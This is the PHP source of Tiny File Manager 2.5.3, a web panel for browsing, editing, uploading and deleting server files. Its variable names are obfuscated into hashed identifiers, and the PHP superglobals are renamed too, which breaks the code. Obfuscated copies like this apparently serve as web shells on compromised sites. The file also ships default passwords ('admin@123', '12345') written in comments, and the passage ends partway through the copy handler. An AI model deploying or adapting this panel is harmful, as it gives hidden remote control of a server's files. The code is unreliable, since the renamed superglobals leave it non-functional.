<?php
//Default Configuration
$v35ff31ce = '{"lang":"en","error_reporting":false,"show_hidden":false,"hide_Cols":false,"theme":"light"}';

/**
 * H3K | Tiny File Manager V2.5.3
 * @author CCP Programmers
 * @email ccpprogrammers@gmail.com
 * @github https://github.com/prasathmani/tinyfilemanager
 * @link https://tinyfilemanager.github.io
 */

//TFM version
define('VERSION', '2.5.3');

//Application Title
define('APP_TITLE', 'Tiny File Manager');

// --- EDIT BELOW CONFIGURATION CAREFULLY ---

// Auth with login/password
// set true/false to enable/disable it
// Is independent from IP white- and blacklisting
$v0cf89f1c = true;

// Login user name and password
// Users: array('Username' => 'Password', 'Username2' => 'Password2', ...)
// Generate secure password hash - https://tinyfilemanager.github.io/docs/pwd.html
$v2b5bb329 = array(
    'admin' => '$2y$10$/K.hjNr84lLNDt8fTXjoI.DBp6PpeyoJ.mGwrrLuCZfAwfSAGqhOW', //admin@123
    'user' => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO' //12345
);

// Readonly users
// e.g. array('users', 'guest', ...)
$vdd01a53c = array(
    'user'
);

// Global readonly, including when auth is not being used
$v4988a560 = false;

// user specific directories
// array('Username' => 'Directory path', 'Username2' => 'Directory path', ...)
$vd55eb17e = array();

// Enable highlight.js (https://highlightjs.org/) on view's page
$vcf766ef7 = true;

// highlight.js style
// for dark theme use 'ir-black'
$v6b8ecf71 = 'vs';

// Enable ace.js (https://ace.c9.io/) on view's page
$v48dd2ccc = true;

// Default timezone for date() and time()
// Doc - http://php.net/manual/en/timezones.php
$vd52b755b = 'Etc/UTC'; // UTC

// Root path for file manager
// use absolute path of directory i.e: '/var/www/folder' or $_SERVER['DOCUMENT_ROOT'].'/folder'
$vfe0b8949 = $v54ac8e37['DOCUMENT_ROOT'];

// Root url for links in file manager.Relative to $http_host. Variants: '', 'path/to/subfolder'
// Will not working if $root_path will be outside of server document root
$v736b3163 = '';

// Server hostname. Can set manually if wrong
// $_SERVER['HTTP_HOST'].'/folder'
$vc1b5752c = $v54ac8e37['HTTP_HOST'];

// input encoding for iconv
$v9f532972 = 'UTF-8';

// date() format for file modification date
// Doc - https://www.php.net/manual/en/function.date.php
$vd440eab8 = 'm/d/Y g:i A';

// Path display mode when viewing file information
// 'full' => show full path
// 'relative' => show path relative to root_path
// 'host' => show path on the host
$v4178fd2f = 'full';

// Allowed file extensions for create and rename files
// e.g. 'txt,html,css,js'
$v79c1ffa3 = '';

// Allowed file extensions for upload files
// e.g. 'gif,png,jpg,html,txt'
$vbda5c580 = '';

// Favicon path. This can be either a full url to an .PNG image, or a path based on the document root.
// full path, e.g http://example.com/favicon.png
// local path, e.g images/icons/favicon.png
$v9b1ab6a4 = '';

// Files and folders to excluded from listing
// e.g. array('myfile.html', 'personal-folder', '*.php', ...)
$v79f58c76 = array();

// Online office Docs Viewer
// Availabe rules are 'google', 'microsoft' or false
// Google => View documents using Google Docs Viewer
// Microsoft => View documents using Microsoft Web Apps Viewer
// false => disable online doc viewer
$v3065d34d = 'google';

// Sticky Nav bar
// true => enable sticky header
// false => disable sticky header
$v587463a3 = true;

// Maximum file upload size
// Increase the following values in php.ini to work properly
// memory_limit, upload_max_filesize, post_max_size
$v4a3c6ecd = 5000000000; // size 5,000,000,000 bytes (~5GB)

// chunk size used for upload
// eg. decrease to 1MB if nginx reports problem 413 entity too large
$vf2decf47 = 2000000; // chunk size 2,000,000 bytes (~2MB)

// Possible rules are 'OFF', 'AND' or 'OR'
// OFF => Don't check connection IP, defaults to OFF
// AND => Connection must be on the whitelist, and not on the blacklist
// OR => Connection must be on the whitelist, or not on the blacklist
$v93f425d6 = 'OFF';

// Should users be notified of their block?
$vc43c68aa = true;

// IP-addresses, both ipv4 and ipv6
$v0e679027 = array(
    '127.0.0.1',    // local ipv4
    '::1'           // local ipv6
);

// IP-addresses, both ipv4 and ipv6
$v2e93baff = array(
    '0.0.0.0',      // non-routable meta ipv4
    '::'            // non-routable meta ipv6
);

// if User has the external config file, try to use it to override the default config above [config.php]
// sample config - https://tinyfilemanager.github.io/config-sample.txt
$v320248b1 = __DIR__.'/config.php';
if (is_readable($v320248b1)) {
    @include($v320248b1);
}

// External CDN resources that can be used in the HTML (replace for GDPR compliance)
$v4c8d53f6 = array(
    'css-bootstrap' => '<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">',
    'css-dropzone' => '<link href="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.css" rel="stylesheet">',
    'css-font-awesome' => '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" crossorigin="anonymous">',
    'css-highlightjs' => '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/styles/' . $v6b8ecf71 . '.min.css">',
    'js-ace' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.13.1/ace.js"></script>',
    'js-bootstrap' => '<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>',
    'js-dropzone' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.js"></script>',
    'js-jquery' => '<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>',
    'js-jquery-datatables' => '<script src="https://cdn.datatables.net/1.13.1/js/jquery.dataTables.min.js" crossorigin="anonymous" defer></script>',
    'js-highlightjs' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/highlight.min.js"></script>',
    'pre-jsdelivr' => '<link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin/><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/>',
    'pre-cloudflare' => '<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin/><link rel="dns-prefetch" href="https://cdnjs.cloudflare.com"/>'
);

// --- EDIT BELOW CAREFULLY OR DO NOT EDIT AT ALL ---

// max upload file size
define('MAX_UPLOAD_SIZE', $v4a3c6ecd);

// upload chunk size
define('UPLOAD_CHUNK_SIZE', $vf2decf47);

// private key and session name to store to the session
if ( !defined( 'FM_SESSION_ID')) {
    define('FM_SESSION_ID', 'filemanager');
}

// Configuration
$ve4627ce1 = new FM_Config();

// Default language
$vdcd4149e = isset($ve4627ce1->data['lang']) ? $ve4627ce1->data['lang'] : 'en';

// Show or hide files and folders that starts with a dot
$vdb523aae = isset($ve4627ce1->data['show_hidden']) ? $ve4627ce1->data['show_hidden'] : true;

// PHP error reporting - false = Turns off Errors, true = Turns on Errors
$v2eaa8286 = isset($ve4627ce1->data['error_reporting']) ? $ve4627ce1->data['error_reporting'] : true;

// Hide Permissions and Owner cols in file-listing
$v89e0b6be = isset($ve4627ce1->data['hide_Cols']) ? $ve4627ce1->data['hide_Cols'] : true;

// Theme
$vb6b826ad = isset($ve4627ce1->data['theme']) ? $ve4627ce1->data['theme'] : 'light';

define('FM_THEME', $vb6b826ad);

//available languages
$v248427d4 = array(
    'en' => 'English'
);

if ($v2eaa8286 == true) {
    @ini_set('error_reporting', E_ALL);
    @ini_set('display_errors', 1);
} else {
    @ini_set('error_reporting', E_ALL);
    @ini_set('display_errors', 0);
}

// if fm included
if (defined('FM_EMBED')) {
    $v0cf89f1c = false;
    $v587463a3 = false;
} else {
    @set_time_limit(600);

    date_default_timezone_set($vd52b755b);

    ini_set('default_charset', 'UTF-8');
    if (version_compare(PHP_VERSION, '5.6.0', '<') && function_exists('mb_internal_encoding')) {
        mb_internal_encoding('UTF-8');
    }
    if (function_exists('mb_regex_encoding')) {
        mb_regex_encoding('UTF-8');
    }

    session_cache_limiter('nocache'); // Prevent logout issue after page was cached
    session_name(FM_SESSION_ID );
    function session_error_handling_function($v955a89e8, $v8a0e089a, $v81f430be, $vd20d097d) {
        // Permission denied for default session, try to create a new one
        if ($v955a89e8 == 2) {
            session_abort();
            session_id(session_create_id());
            @session_start();
        }
    }
    set_error_handler('session_error_handling_function');
    session_start();
    restore_error_handler();
}

//Generating CSRF Token
if (empty($vbc4af197['token'])) {
    if (function_exists('random_bytes')) {
        $vbc4af197['token'] = bin2hex(random_bytes(32));
    } else {
    	$vbc4af197['token'] = bin2hex(openssl_random_pseudo_bytes(32));
    }
}

if (empty($v2b5bb329)) {
    $v0cf89f1c = false;
}

$vc007e853 = isset($v54ac8e37['HTTPS']) && ($v54ac8e37['HTTPS'] == 'on' || $v54ac8e37['HTTPS'] == 1)
    || isset($v54ac8e37['HTTP_X_FORWARDED_PROTO']) && $v54ac8e37['HTTP_X_FORWARDED_PROTO'] == 'https';

// update $root_url based on user specific directories
if (isset($vbc4af197[FM_SESSION_ID]['logged']) && !empty($vd55eb17e[$vbc4af197[FM_SESSION_ID]['logged']])) {
    $v1c775724 = fm_clean_path(dirname($v54ac8e37['PHP_SELF']));
    $v736b3163 =  $v736b3163.$v1c775724.DIRECTORY_SEPARATOR.$vd55eb17e[$vbc4af197[FM_SESSION_ID]['logged']];
}
// clean $root_url
$v736b3163 = fm_clean_path($v736b3163);

// abs path for site
defined('FM_ROOT_URL') || define('FM_ROOT_URL', ($vc007e853 ? 'https' : 'http') . '://' . $vc1b5752c . (!empty($v736b3163) ? '/' . $v736b3163 : ''));
defined('FM_SELF_URL') || define('FM_SELF_URL', ($vc007e853 ? 'https' : 'http') . '://' . $vc1b5752c . $v54ac8e37['PHP_SELF']);

// logout
if (isset($v51e4dd52['logout'])) {
    unset($vbc4af197[FM_SESSION_ID]['logged']);
    unset( $vbc4af197['token']); 
    fm_redirect(FM_SELF_URL);
}

// Validate connection IP
if ($v93f425d6 != 'OFF') {
    function getClientIP() {
        if (array_key_exists('HTTP_CF_CONNECTING_IP', $v54ac8e37)) {
            return  $v54ac8e37["HTTP_CF_CONNECTING_IP"];
        }else if (array_key_exists('HTTP_X_FORWARDED_FOR', $v54ac8e37)) {
            return  $v54ac8e37["HTTP_X_FORWARDED_FOR"];
        }else if (array_key_exists('REMOTE_ADDR', $v54ac8e37)) {
            return $v54ac8e37['REMOTE_ADDR'];
        }else if (array_key_exists('HTTP_CLIENT_IP', $v54ac8e37)) {
            return $v54ac8e37['HTTP_CLIENT_IP'];
        }
        return '';
    }

    $vfdabd31b = getClientIP();
    $v9a1be308 = false;
    $v1ca7f6ef = in_array($vfdabd31b, $v0e679027);
    $ve5ad6bdf = in_array($vfdabd31b, $v2e93baff);

    if($v93f425d6 == 'AND'){
        if($v1ca7f6ef == true && $ve5ad6bdf == false){
            $v9a1be308 = true;
        }
    } else
    if($v93f425d6 == 'OR'){
         if($v1ca7f6ef == true || $ve5ad6bdf == false){
            $v9a1be308 = true;
        }
    }

    if($v9a1be308 == false){
        trigger_error('User connection denied from: ' . $vfdabd31b, E_USER_WARNING);

        if($vc43c68aa == false){
            fm_set_msg(lng('Access denied. IP restriction applicable'), 'error');
            fm_show_header_login();
            fm_show_message();
        }
        exit();
    }
}

// Checking if the user is logged in or not. If not, it will show the login form.
if ($v0cf89f1c) {
    if (isset($vbc4af197[FM_SESSION_ID]['logged'], $v2b5bb329[$vbc4af197[FM_SESSION_ID]['logged']])) {
        // Logged
    } elseif (isset($v67987c65['fm_usr'], $v67987c65['fm_pwd'], $v67987c65['token'])) {
        // Logging In
        sleep(1);
        if(function_exists('password_verify')) {
            if (isset($v2b5bb329[$v67987c65['fm_usr']]) && isset($v67987c65['fm_pwd']) && password_verify($v67987c65['fm_pwd'], $v2b5bb329[$v67987c65['fm_usr']]) && verifyToken($v67987c65['token'])) {
                $vbc4af197[FM_SESSION_ID]['logged'] = $v67987c65['fm_usr'];
                fm_set_msg(lng('You are logged in'));
                fm_redirect(FM_SELF_URL);
            } else {
                unset($vbc4af197[FM_SESSION_ID]['logged']);
                fm_set_msg(lng('Login failed. Invalid username or password'), 'error');
                fm_redirect(FM_SELF_URL);
            }
        } else {
            fm_set_msg(lng('password_hash not supported, Upgrade PHP version'), 'error');;
        }
    } else {
        // Form
        unset($vbc4af197[FM_SESSION_ID]['logged']);
        fm_show_header_login();
        ?>
        <section class="h-100">
            <div class="container h-100">
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        <div class="card fat <?php echo fm_get_theme(); ?>">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <div class="mb-3">
                                       <div class="brand">
                                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" M1008 width="100%" height="80px" viewBox="0 0 238.000000 140.000000" aria-label="H3K Tiny File Manager">
                                                <g transform="translate(0.000000,140.000000) scale(0.100000,-0.100000)" fill="#000000" stroke="none">
                                                    <path d="M160 700 l0 -600 110 0 110 0 0 260 0 260 70 0 70 0 0 -260 0 -260 110 0 110 0 0 600 0 600 -110 0 -110 0 0 -260 0 -260 -70 0 -70 0 0 260 0 260 -110 0 -110 0 0 -600z"/>
                                                    <path fill="#003500" d="M1008 1227 l-108 -72 0 -117 0 -118 110 0 110 0 0 110 0 110 70 0 70 0 0 -180 0 -180 -125 0 c-69 0 -125 -3 -125 -6 0 -3 23 -39 52 -80 l52 -74 73 0 73 0 0 -185 0 -185 -70 0 -70 0 0 115 0 115 -110 0 -110 0 0 -190 0 -190 181 0 181 0 109 73 108 72 1 181 0 181 -69 48 -68 49 68 50 69 49 0 249 0 248 -182 -1 -183 0 -107 -72z"/>
                                                    <path d="M1640 700 l0 -600 110 0 110 0 0 208 0 208 35 34 35 34 35 -34 35 -34 0 -208 0 -208 110 0 110 0 0 212 0 213 -87 87 -88 88 88 88 87 87 0 213 0 212 -110 0 -110 0 0 -208 0 -208 -70 -69 -70 -69 0 277 0 277 -110 0 -110 0 0 -600z"/></g>
                                            </svg>
                                        </div>
                                        <div class="text-center">
                                            <h1 class="card-title"><?php echo APP_TITLE; ?></h1>
                                        </div>
                                    </div>
                                    <hr />
                                    <div class="mb-3">
                                        <label for="fm_usr" class="pb-2"><?php echo lng('Username'); ?></label>
                                        <input type="text" class="form-control" id="fm_usr" name="fm_usr" required autofocus>
                                    </div>

                                    <div class="mb-3">
                                        <label for="fm_pwd" class="pb-2"><?php echo lng('Password'); ?></label>
                                        <input type="password" class="form-control" id="fm_pwd" name="fm_pwd" required>
                                    </div>

                                    <div class="mb-3">
                                        <?php fm_show_message(); ?>
                                    </div>
                                    <input type="hidden" name="token" value="<?php echo htmlentities($vbc4af197['token']); ?>" />
                                    <div class="mb-3">
                                        <button type="submit" class="btn btn-success btn-block w-100 mt-4" role="button">
                                            <?php echo lng('Login'); ?>
                                        </button>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="https://tinyfilemanager.github.io/" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">CCP Programmers</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <?php
        fm_show_footer_login();
        exit;
    }
}

// update root path
if ($v0cf89f1c && isset($vbc4af197[FM_SESSION_ID]['logged'])) {
    $vfe0b8949 = isset($vd55eb17e[$vbc4af197[FM_SESSION_ID]['logged']]) ? $vd55eb17e[$vbc4af197[FM_SESSION_ID]['logged']] : $vfe0b8949;
}

// clean and check $root_path
$vfe0b8949 = rtrim($vfe0b8949, '\\/');
$vfe0b8949 = str_replace('\\', '/', $vfe0b8949);
if (!@is_dir($vfe0b8949)) {
    echo "<h1>".lng('Root path')." \"{$vfe0b8949}\" ".lng('not found!')." </h1>";
    exit;
}

defined('FM_SHOW_HIDDEN') || define('FM_SHOW_HIDDEN', $vdb523aae);
defined('FM_ROOT_PATH') || define('FM_ROOT_PATH', $vfe0b8949);
defined('FM_LANG') || define('FM_LANG', $vdcd4149e);
defined('FM_FILE_EXTENSION') || define('FM_FILE_EXTENSION', $v79c1ffa3);
defined('FM_UPLOAD_EXTENSION') || define('FM_UPLOAD_EXTENSION', $vbda5c580);
defined('FM_EXCLUDE_ITEMS') || define('FM_EXCLUDE_ITEMS', (version_compare(PHP_VERSION, '7.0.0', '<') ? serialize($v79f58c76) : $v79f58c76));
defined('FM_DOC_VIEWER') || define('FM_DOC_VIEWER', $v3065d34d);
define('FM_READONLY', $v4988a560 || ($v0cf89f1c && !empty($vdd01a53c) && isset($vbc4af197[FM_SESSION_ID]['logged']) && in_array($vbc4af197[FM_SESSION_ID]['logged'], $vdd01a53c)));
define('FM_IS_WIN', DIRECTORY_SEPARATOR == '\\');

// always use ?p=
if (!isset($v51e4dd52['p']) && empty($v4c6b44f6)) {
    fm_redirect(FM_SELF_URL . '?p=');
}

// get path
$v805201f7 = isset($v51e4dd52['p']) ? $v51e4dd52['p'] : (isset($v67987c65['p']) ? $v67987c65['p'] : '');

// clean path
$v805201f7 = fm_clean_path($v805201f7);

// for ajax request - save
$vaaa76c7f = file_get_contents('php://input');
$v67987c65 = (strpos($vaaa76c7f, 'ajax') != FALSE && strpos($vaaa76c7f, 'save') != FALSE) ? json_decode($vaaa76c7f, true) : $v67987c65;

// instead globals vars
define('FM_PATH', $v805201f7);
define('FM_USE_AUTH', $v0cf89f1c);
define('FM_EDIT_FILE', $v48dd2ccc);
defined('FM_ICONV_INPUT_ENC') || define('FM_ICONV_INPUT_ENC', $v9f532972);
defined('FM_USE_HIGHLIGHTJS') || define('FM_USE_HIGHLIGHTJS', $vcf766ef7);
defined('FM_HIGHLIGHTJS_STYLE') || define('FM_HIGHLIGHTJS_STYLE', $v6b8ecf71);
defined('FM_DATETIME_FORMAT') || define('FM_DATETIME_FORMAT', $vd440eab8);

unset($v805201f7, $v0cf89f1c, $v9f532972, $vcf766ef7, $v6b8ecf71);

/*************************** ACTIONS ***************************/

// Handle all AJAX Request
if ((isset($vbc4af197[FM_SESSION_ID]['logged'], $v2b5bb329[$vbc4af197[FM_SESSION_ID]['logged']]) || !FM_USE_AUTH) && isset($v67987c65['ajax'], $v67987c65['token']) && !FM_READONLY) {
    if(!verifyToken($v67987c65['token'])) {
        header('HTTP/1.0 401 Unauthorized');
        die("Invalid Token.");
    }

    //search : get list of files from the current folder
    if(isset($v67987c65['type']) && $v67987c65['type']=="search") {
        $va13c698e = $v67987c65['path'] == "." ? '': $v67987c65['path'];
        $v00418a20 = scan(fm_clean_path($va13c698e), $v67987c65['content']);
        echo json_encode($v00418a20);
        exit();
    }

    // save editor file
    if (isset($v67987c65['type']) && $v67987c65['type'] == "save") {
        // get current path
        $v5424ec5f = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $v5424ec5f .= '/' . FM_PATH;
        }
        // check path
        if (!is_dir($v5424ec5f)) {
            fm_redirect(FM_SELF_URL . '?p=');
        }
        $v81f430be = $v51e4dd52['edit'];
        $v81f430be = fm_clean_path($v81f430be);
        $v81f430be = str_replace('/', '', $v81f430be);
        if ($v81f430be == '' || !is_file($v5424ec5f . '/' . $v81f430be)) {
            fm_set_msg(lng('File not found'), 'error');
            $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
        }
        header('X-XSS-Protection:0');
        $v6314089b = $v5424ec5f . '/' . $v81f430be;

        $v958ab932 = $v67987c65['content'];
        $vc15ab669 = fopen($v6314089b, "w");
        $vcb33fb76 = @fwrite($vc15ab669, $v958ab932);
        fclose($vc15ab669);
        if ($vcb33fb76 === false){
            header("HTTP/1.1 500 Internal Server Error");
            die("Could Not Write File! - Check Permissions / Ownership");
        }
        die(true);
    }

    // backup files
    if (isset($v67987c65['type']) && $v67987c65['type'] == "backup" && !empty($v67987c65['file'])) {
        $v3a8ad1af = fm_clean_path($v67987c65['file']);
        $vc60f4630 = FM_ROOT_PATH . '/';
        if (!empty($v67987c65['path'])) {
            $v9ad3d1cf = fm_clean_path($v67987c65['path']);
            $vc60f4630 .= "{$v9ad3d1cf}/";
        }
        $v86dd0840 = date("dMy-His");
        $vc62954a3 = "{$v3a8ad1af}-{$v86dd0840}.bak";
        $v22a5bbbc = $vc60f4630 . $v3a8ad1af;
        try {
            if (!file_exists($v22a5bbbc)) {
                throw new Exception("File {$v3a8ad1af} not found");
            }
            if (copy($v22a5bbbc, $vc60f4630 . $vc62954a3)) {
                echo "Backup {$vc62954a3} created";
            } else {
                throw new Exception("Could not copy file {$v3a8ad1af}");
            }
        } catch (Exception $vb8673196) {
            echo $vb8673196->getMessage();
        }
    }

    // Save Config
    if (isset($v67987c65['type']) && $v67987c65['type'] == "settings") {
        global $ve4627ce1, $vdcd4149e, $v2eaa8286, $vdb523aae, $v248427d4, $v89e0b6be, $vb6b826ad;
        $va53ccb7d = $v67987c65['js-language'];
        fm_get_translations([]);
        if (!array_key_exists($va53ccb7d, $v248427d4)) {
            $va53ccb7d = 'en';
        }

        $v35e66455 = isset($v67987c65['js-error-report']) && $v67987c65['js-error-report'] == "true" ? true : false;
        $v940299cd = isset($v67987c65['js-show-hidden']) && $v67987c65['js-show-hidden'] == "true" ? true : false;
        $v67a3453b = isset($v67987c65['js-hide-cols']) && $v67987c65['js-hide-cols'] == "true" ? true : false;
        $v018bf323 = $v67987c65['js-theme-3'];

        if ($ve4627ce1->data['lang'] != $va53ccb7d) {
            $ve4627ce1->data['lang'] = $va53ccb7d;
            $vdcd4149e = $va53ccb7d;
        }
        if ($ve4627ce1->data['error_reporting'] != $v35e66455) {
            $ve4627ce1->data['error_reporting'] = $v35e66455;
            $v2eaa8286 = $v35e66455;
        }
        if ($ve4627ce1->data['show_hidden'] != $v940299cd) {
            $ve4627ce1->data['show_hidden'] = $v940299cd;
            $vdb523aae = $v940299cd;
        }
        if ($ve4627ce1->data['show_hidden'] != $v940299cd) {
            $ve4627ce1->data['show_hidden'] = $v940299cd;
            $vdb523aae = $v940299cd;
        }
        if ($ve4627ce1->data['hide_Cols'] != $v67a3453b) {
            $ve4627ce1->data['hide_Cols'] = $v67a3453b;
            $v89e0b6be = $v67a3453b;
        }
        if ($ve4627ce1->data['theme'] != $v018bf323) {
            $ve4627ce1->data['theme'] = $v018bf323;
            $vb6b826ad = $v018bf323;
        }
        $ve4627ce1->save();
        echo true;
    }

    // new password hash
    if (isset($v67987c65['type']) && $v67987c65['type'] == "pwdhash") {
        $v19415ac3 = isset($v67987c65['inputPassword2']) && !empty($v67987c65['inputPassword2']) ? password_hash($v67987c65['inputPassword2'], PASSWORD_DEFAULT) : '';
        echo $v19415ac3;
    }

    //upload using url
    if(isset($v67987c65['type']) && $v67987c65['type'] == "upload" && !empty($v45647128["uploadurl"])) {
        $v5424ec5f = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $v5424ec5f .= '/' . FM_PATH;
        }

         function event_callback ($ve504ce79) {
            global $v2d317817;
            echo json_encode($ve504ce79);
        }

        function get_file_path () {
            global $v5424ec5f, $vf0c428c3, $vb07ac9bc;
            return $v5424ec5f."/".basename($vf0c428c3->name);
        }

        $vb444434e = !empty($v45647128["uploadurl"]) && preg_match("|^http(s)?://.+$|", stripslashes($v45647128["uploadurl"])) ? stripslashes($v45647128["uploadurl"]) : null;

        //prevent 127.* domain and known ports
        $v76b25410 = parse_url($vb444434e, PHP_URL_HOST);
        $v4055f0ca = parse_url($vb444434e, PHP_URL_PORT);
        $va8875d30 = [22, 23, 25, 3306];

        if (preg_match("/^localhost$|^127(?:\.[0-9]+){0,2}\.[0-9]+$|^(?:0*\:)*?:?0*1$/i", $v76b25410) || in_array($v4055f0ca, $va8875d30)) {
            $vc82279df = array("message" => "URL is not allowed");
            event_callback(array("fail" => $vc82279df));
            exit();
        }

        $va5b37708 = false;
        $vb07ac9bc = tempnam(sys_get_temp_dir(), "upload-");
        $vf0c428c3 = new stdClass();
        $vf0c428c3->name = trim(basename($vb444434e), ".\x00..\x20");

        $v0bf4bff0 = (FM_UPLOAD_EXTENSION) ? explode(',', FM_UPLOAD_EXTENSION) : false;
        $v00b4247d = strtolower(pathinfo($vf0c428c3->name, PATHINFO_EXTENSION));
        $ve0c1a0ea = ($v0bf4bff0) ? in_array($v00b4247d, $v0bf4bff0) : true;

        $vc82279df = false;

        if(!$ve0c1a0ea) {
            $vc82279df = array("message" => "File extension is not allowed");
            event_callback(array("fail" => $vc82279df));
            exit();
        }

        if (!$vb444434e) {
            $v7a56190e = false;
        } else if ($va5b37708) {
            @$v25235d49 = fopen($vb07ac9bc, "w");
            @$v8bdc3472 = curl_init($vb444434e);
            curl_setopt($v8bdc3472, CURLOPT_NOPROGRESS, false );
            curl_setopt($v8bdc3472, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($v8bdc3472, CURLOPT_FILE, $v25235d49);
            @$v7a56190e = curl_exec($v8bdc3472);
            $v3b331e18 = curl_getinfo($v8bdc3472);
            if (!$v7a56190e) {
                $vc82279df = array("message" => curl_error($v8bdc3472));
            }
            @curl_close($v8bdc3472);
            fclose($v25235d49);
            $vf0c428c3->size = $v3b331e18["size_download"];
            $vf0c428c3->type = $v3b331e18["content_type"];
        } else {
            $v5d38297b = stream_context_create();
            @$v7a56190e = copy($vb444434e, $vb07ac9bc, $v5d38297b);
            if (!$v7a56190e) {
                $vc82279df = error_get_last();
            }
        }

        if ($v7a56190e) {
            $v7a56190e = rename($vb07ac9bc, strtok(get_file_path(), '?'));
        }

        if ($v7a56190e) {
            event_callback(array("done" => $vf0c428c3));
        } else {
            unlink($vb07ac9bc);
            if (!$vc82279df) {
                $vc82279df = array("message" => "Invalid url parameter");
            }
            event_callback(array("fail" => $vc82279df));
        }
    }
    exit();
}

// Delete file / folder
if (isset($v51e4dd52['del'], $v67987c65['token']) && !FM_READONLY) {
    $vbd2916fe = str_replace( '/', '', fm_clean_path( $v51e4dd52['del'] ) );
    if ($vbd2916fe != '' && $vbd2916fe != '..' && $vbd2916fe != '.' && verifyToken($v67987c65['token'])) {
        $v5424ec5f = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $v5424ec5f .= '/' . FM_PATH;
        }
        $ve8faa12c = is_dir($v5424ec5f . '/' . $vbd2916fe);
        if (fm_rdelete($v5424ec5f . '/' . $vbd2916fe)) {
            $v8a0e089a = $ve8faa12c ? lng('Folder').' <b>%s</b> '.lng('Deleted') : lng('File').' <b>%s</b> '.lng('Deleted');
            fm_set_msg(sprintf($v8a0e089a, fm_enc($vbd2916fe)));
        } else {
            $v8a0e089a = $ve8faa12c ? lng('Folder').' <b>%s</b> '.lng('not deleted') : lng('File').' <b>%s</b> '.lng('not deleted');
            fm_set_msg(sprintf($v8a0e089a, fm_enc($vbd2916fe)), 'error');
        }
    } else {
        fm_set_msg(lng('Invalid file or folder name'), 'error');
    }
    $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
}

// Create a new file/folder
if (isset($v67987c65['newfilename'], $v67987c65['newfile'], $v67987c65['token']) && !FM_READONLY) {
    $v920fde95 = urldecode($v67987c65['newfile']);
    $vd97e09ef = str_replace( '/', '', fm_clean_path( strip_tags( $v67987c65['newfilename'] ) ) );
    if (fm_isvalid_filename($vd97e09ef) && $vd97e09ef != '' && $vd97e09ef != '..' && $vd97e09ef != '.' && verifyToken($v67987c65['token'])) {
        $v5424ec5f = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $v5424ec5f .= '/' . FM_PATH;
        }
        if ($v920fde95 == "file") {
            if (!file_exists($v5424ec5f . '/' . $vd97e09ef)) {
                if(fm_is_valid_ext($vd97e09ef)) {
                    @fopen($v5424ec5f . '/' . $vd97e09ef, 'w') or die('Cannot open file:  ' . $vd97e09ef);
                    fm_set_msg(sprintf(lng('File').' <b>%s</b> '.lng('Created'), fm_enc($vd97e09ef)));
                } else {
                    fm_set_msg(lng('File extension is not allowed'), 'error');
                }
            } else {
                fm_set_msg(sprintf(lng('File').' <b>%s</b> '.lng('already exists'), fm_enc($vd97e09ef)), 'alert');
            }
        } else {
            if (fm_mkdir($v5424ec5f . '/' . $vd97e09ef, false) === true) {
                fm_set_msg(sprintf(lng('Folder').' <b>%s</b> '.lng('Created'), $vd97e09ef));
            } elseif (fm_mkdir($v5424ec5f . '/' . $vd97e09ef, false) === $v5424ec5f . '/' . $vd97e09ef) {
                fm_set_msg(sprintf(lng('Folder').' <b>%s</b> '.lng('already exists'), fm_enc($vd97e09ef)), 'alert');
            } else {
                fm_set_msg(sprintf(lng('Folder').' <b>%s</b> '.lng('not created'), fm_enc($vd97e09ef)), 'error');
            }
        }
    } else {
        fm_set_msg(lng('Invalid characters in file or folder name'), 'error');
    }
    $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
}

// Copy folder / file
if (isset($v51e4dd52['copy'], $v51e4dd52['finish']) && !FM_READONLY) {
    // from
    $vee6d2820 = urldecode($v51e4dd52['copy']);
    $vee6d2820 = fm_clean_path($vee6d2820);
    // empty path
    if ($vee6d2820 == '') {
        fm_set_msg(lng('Source path not defined'), 'error');
        $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
    }
    // abs path from
    $v0b5a2029 = FM_ROOT_PATH . '/' . $vee6d2820;
    // abs path to
    $vf25f7e4e = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $vf25f7e4e .= '/' . FM_PATH;
    }
    $vf25f7e4e .= '/' . basename($v0b5a2029);
    // move?
